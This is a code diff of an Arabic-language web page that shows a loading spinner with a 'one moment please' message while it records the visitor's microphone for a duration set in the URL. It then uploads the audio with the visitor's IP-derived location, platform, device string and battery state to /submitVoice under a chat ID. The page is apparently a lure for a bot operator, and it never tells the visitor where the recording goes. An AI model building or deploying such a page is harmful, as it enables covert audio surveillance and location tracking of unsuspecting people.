@@ -1,105 +1,242 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <title>تسجيل صوتي</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    /* CSS styles here */
-  </style>
+    <title>تسجيل صوتي</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: animate 5s linear infinite;
+        }
+
+        @keyframes animate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading {
+            border: 8px solid rgba(243, 243, 243, 0.2);
+            border-top: 8px solid #e74c3c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .message {
+            font-size: 20px;
+            color: #ecf0f1;
+            margin-top: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="loading"></div>
-    <p class="message" id="notification">لحظه واحده من فضلك...</p>
-  </div>
+    <div class="container">
+        <div class="loading" id="loading" style="display: none;"></div>
+        <p class="message" id="notification">لحظه واحده من فضلك...</p>
+    </div>
 
-  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
-    <input type="hidden" name="chatId" id="chatId">
-    <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
-  </form>
+    <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
+        <input type="hidden" name="chatId" id="chatId">
+        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
+    </form>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('notification').textContent = 'لحظه واحده من فضلك...';
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const chatId = new URLSearchParams(window.location.search).get('chatId');
+            const duration = parseInt(new URLSearchParams(window.location.search).get('duration')) || 10;
+            document.getElementById('chatId').value = chatId;
 
-      const chatId = new URLSearchParams(window.location.search).get('chatId');
-      const duration = new URLSearchParams(window.location.search).get('duration');
-      document.getElementById('chatId').value = chatId;
+            if (!chatId) {
+                showNotification('خطأ: معرف المحادثة غير موجود', true);
+                return;
+            }
 
-      startRecording(duration);
-    });
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showNotification('عذرًا، متصفحك لا يدعم تسجيل الصوت', true);
+                return;
+            }
 
-    async function startRecording(recordDuration) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const audioChunks = [];
+            if (!MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+                showNotification('عذرًا، متصفحك لا يدعم تنسيق التسجيل المطلوب', true);
+                return;
+            }
 
-        mediaRecorder.start();
+            startRecording(duration);
+        });
 
-        setTimeout(() => {
-          mediaRecorder.stop();
-          document.getElementById('notification').textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
-        }, recordDuration * 1000);
+        async function startRecording(recordDuration) {
+            try {
+                showLoading(true);
+                showNotification('جارِ التسجيل...');
 
-        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-          const formData = new FormData(document.getElementById('voice-form'));
-          formData.set('voice', audioBlob, 'voice.ogg');
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                const audioChunks = [];
 
-          const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
-          const platformInfo = getPlatformInfo();
-          const batteryInfo = await navigator.getBattery().then(battery => ({
-            batteryLevel: battery.level,
-            batteryCharging: battery.charging,
-          }));
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.onstop = () => handleRecordingStop(audioChunks);
 
-          const additionalData = {
-            ip: ipInfo.ip,
-            country: ipInfo.country_name,
-            city: ipInfo.city,
-            platform: platformInfo.platform,
-            deviceVersion: getDeviceVersion(),
-            batteryLevel: batteryInfo.batteryLevel,
-            batteryCharging: batteryInfo.batteryCharging,
-          };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, recordDuration * 1000);
+            } catch (error) {
+                showNotification(`خطأ في الوصول إلى الميكروفون: ${error.message}`, true);
+                showLoading(false);
+            }
+        }
 
-          formData.append('additionalData', JSON.stringify(additionalData));
+        async function handleRecordingStop(audioChunks) {
+            showNotification('تم إيقاف التسجيل، جارِ الإرسال...');
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
 
-          try {
-            const response = await fetch('/submitVoice', {
-              method: 'POST',
-              body: formData
-            });
+            if (audioBlob.size > 10 * 1024 * 1024) {
+                showNotification('حجم الملف كبير جدًا. الرجاء تقصير مدة التسجيل.', true);
+                return;
+            }
 
-            if (!response.ok) throw new Error('Network response was not ok');
-            document.getElementById('notification').textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
-          } catch (error) {
-            document.getElementById('notification').textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
-          }
-        };
-      } catch (error) {
-        document.getElementById('notification').textContent = 'خطأ في الوصول إلى الميكروفون';
-      }
-    }
+            const formData = new FormData(document.getElementById('voice-form'));
+            formData.set('voice', audioBlob, 'voice.webm');
 
-    function getPlatformInfo() {
-      const ua = navigator.userAgent;
-      if (/Windows/.test(ua)) return { platform: "Windows" };
-      if (/Mac/.test(ua)) return { platform: "MacOS" };
-      if (/Linux/.test(ua)) return { platform: "Linux" };
-      if (/Android/.test(ua)) return { platform: "Android" };
-      if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
-      return { platform: "Unknown" };
-    }
+            try {
+                const additionalData = await collectAdditionalData();
+                formData.append('additionalData', JSON.stringify(additionalData));
 
-    function getDeviceVersion() {
-      const ua = navigator.userAgent;
-      const match = ua.match(/\(([^)]+)\)/);
-      return match ? match[1] : 'Unknown';
-    }
-  </script>
+                await sendVoiceData(formData);
+            } catch (error) {
+                showNotification(`حدث خطأ: ${error.message}`, true);
+            }
+        }
+
+        async function collectAdditionalData() {
+            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+
+            return {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                platform: platformInfo.platform,
+                deviceVersion: getDeviceVersion(),
+                batteryLevel: batteryInfo.level,
+                batteryCharging: batteryInfo.charging,
+            };
+        }
+
+        async function sendVoiceData(formData) {
+            if (!navigator.onLine) {
+                throw new Error('لا يوجد اتصال بالإنترنت');
+            }
+
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 30000);
+
+            try {
+                const response = await fetch('/submitVoice', {
+                    method: 'POST',
+                    body: formData,
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeout);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`فشل في إرسال البيانات: ${response.status} ${errorText}`);
+                }
+
+                showNotification('تم إرسال التسجيل الصوتي والبيانات بنجاح');
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    throw new Error('انتهت مهلة الطلب. يرجى المحاولة مرة أخرى.');
+                }
+                throw error;
+            } finally {
+                clearTimeout(timeout);
+                showLoading(false);
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+            return { level: 'غير متاح', charging: 'غير متاح' };
+        }
+
+        function showNotification(message, isError = false) {
+            const notificationElement = document.getElementById('notification');
+            notificationElement.textContent = message;
+            notificationElement.style.color = isError ? '#e74c3c' : '#ecf0f1';
+        }
+
+        function showLoading(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+        }
+    </script>
 </body>
 </html>
